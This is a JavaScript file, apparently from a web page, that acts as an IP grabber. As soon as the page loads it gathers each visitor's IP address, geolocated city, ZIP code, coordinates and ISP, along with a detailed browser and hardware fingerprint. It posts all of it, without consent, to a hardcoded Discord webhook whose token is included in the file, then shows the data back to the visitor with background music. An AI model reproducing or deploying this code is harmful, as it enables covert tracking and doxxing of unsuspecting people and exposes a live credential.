// webhook.js

let infoSent = false; // Flag to ensure the webhook info is only sent once

// Function to send information to Discord webhook
function sendToDiscord(info) {
    if (infoSent) return; // Check if the info has already been sent

    const webhookUrl = 'https://discord.com/api/webhooks/1386342407926448238/qLQYNfEDadw-c86v7T3G_xZj95hVrutB7lohKJC2wI8JlvVU-AtIroBDDI3cjiFbxubz';
    const message = {
        content: `User Information:\n
        IP Address: ${info.ip}\n
        Country: ${info.country}\n
        Region: ${info.region}\n
        City: ${info.city}\n
        ZIP Code: ${info.zip}\n
        Full Location: ${info.location}\n
        Latitude: ${info.latitude}\n
        Longitude: ${info.longitude}\n
        Timezone: ${info.timezone}\n
        Current Time: ${info.currentTime}\n
        ISP: ${info.isp}\n
        Organization: ${info.organization}\n
        Autonomous System: ${info.autonomousSystem}\n
        Browser Name: ${info.browserName}\n
        Platform Name: ${info.platformName}\n
        Browser Version: ${info.browserVersion}\n
        Mobile/Tablet: ${info.mobile ? 'Yes' : 'No'}\n
        Referrer: ${info.referrer}\n
        System Languages: ${info.languages}\n
        Screen Width: ${info.screenWidth}\n
        Screen Height: ${info.screenHeight}\n
        Window Width: ${info.windowWidth}\n
        Window Height: ${info.windowHeight}\n
        Display Pixel Depth: ${info.pixelDepth}\n
        Screen Orientation: ${info.orientation}\n
        Screen Rotation: ${info.rotation}\n
        CPU Threads: ${info.cpuCores}\n
        Available Browser Memory: ${info.memory * 1024} MB\n
        GPU Vendor: ${info.gpuVendor}\n
        GPU Info: ${info.gpu}`
    };

    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhookUrl, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log('Message sent successfully');
            infoSent = true; // Set the flag to true after successful sending
        } else if (xhr.readyState === 4) {
            console.error('Error sending message to Discord:', xhr.responseText);
        }
    };
    xhr.send(JSON.stringify(message));
}

// Function to get user information
async function getUserInfo() {
    // Get IP address info
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Get IP details
    const detailsResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const detailsData = await detailsResponse.json();

    // Get PC specs
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const cpuCores = navigator.hardwareConcurrency;

    // Get GPU information
    let gpuInfo = 'N/A';
    let gpuVendor = 'N/A';
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        }
    }

    // Get memory information
    const memory = navigator.deviceMemory || 'N/A'; // in GB

    // Detect browser name
    let browserName = 'Unknown';
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Safari') > -1) {
        browserName = 'Google Chrome';
    } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
        browserName = 'Safari';
    } else if (ua.indexOf('Firefox') > -1) {
        browserName = 'Mozilla Firefox';
    } else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) {
        browserName = 'Internet Explorer';
    }

    return {
        ip: ip,
        country: detailsData.country_name,
        region: detailsData.region,
        city: detailsData.city,
        zip: detailsData.postal,
        location: `${detailsData.city}, ${detailsData.region}, ${detailsData.country_name}`,
        latitude: detailsData.latitude,
        longitude: detailsData.longitude,
        timezone: detailsData.timezone,
        currentTime: new Date().toLocaleString(),
        isp: detailsData.org,
        organization: detailsData.org,
        autonomousSystem: detailsData.asn,
        browserName: browserName,
        platformName: platform,
        browserVersion: ua.match(/Chrome\/([0-9.]+)/) ? ua.match(/Chrome\/([0-9.]+)/)[1] : 'Unknown',
        mobile: /Mobi|Android/i.test(navigator.userAgent),
        referrer: document.referrer || 'None',
        languages: navigator.languages.join(', '),
        screenWidth: screen.width,
        screenHeight: screen.height,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation.type,
        rotation: screen.orientation.angle,
        cpuCores: cpuCores,
        memory: memory,
        gpu: `${gpuVendor} (${gpuInfo})`,
    };
}

// Function to display information and send to Discord
async function showInfo() {
    if (infoSent) return; // Prevent duplicate execution

    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
    const isAndroid = /android/i.test(userAgent);

    const audioElement = document.getElementById('backgroundMusic');

    // Check if the device is iOS or Android and handle accordingly
    if (isIOS || isAndroid) {
        console.log("Mobile device detected");
        audioElement.play().catch(() => {
            console.log("Audio playback was prevented. Please tap on the page to allow audio.");
        });
        document.body.addEventListener('click', () => {
            audioElement.play();
        });
    } else {
        console.log("Non-mobile device detected");
        audioElement.play();
    }

    const info = await getUserInfo();
    const infoDiv = document.getElementById('info');
    const text = `
IP Address: ${info.ip}
Country: ${info.country}
Region: ${info.region}
City: ${info.city}
ZIP Code: ${info.zip}
Full Location: ${info.location}
Latitude: ${info.latitude}
Longitude: ${info.longitude}
Timezone: ${info.timezone}
Current Time: ${info.currentTime}
ISP: ${info.isp}
Organization: ${info.organization}
Autonomous System: ${info.autonomousSystem}
Browser Name: ${info.browserName}
Platform Name: ${info.platformName}
Browser Version: ${info.browserVersion}
Mobile/Tablet: ${info.mobile ? 'Yes' : 'No'}
Referrer: ${info.referrer}
System Languages: ${info.languages}
Screen Width: ${info.screenWidth}
Screen Height: ${info.screenHeight}
Window Width: ${info.windowWidth}
Window Height: ${info.windowHeight}
Display Pixel Depth: ${info.pixelDepth}
Screen Orientation: ${info.orientation}
Screen Rotation: ${info.rotation}
CPU Threads: ${info.cpuCores}
Available Browser Memory: ${info.memory * 1024} MB
GPU Vendor: ${info.gpuVendor}
GPU Info: ${info.gpu}
    `;
    infoDiv.style.display = 'block';
    typeWriter(infoDiv, text);
    sendToDiscord(info); // Send info to Discord
}

// Function to type text
function typeWriter(element, text, i = 0) {
    if (i < text.length) {
        element.innerHTML = text.substring(0, i + 1);
        i++;
        setTimeout(() => typeWriter(element, text, i), 50);
    }
}

// Automatically show info on page load
window.onload = showInfo;

// Add fallback for mobile devices that require user interaction for audio
document.addEventListener('DOMContentLoaded', showInfo);
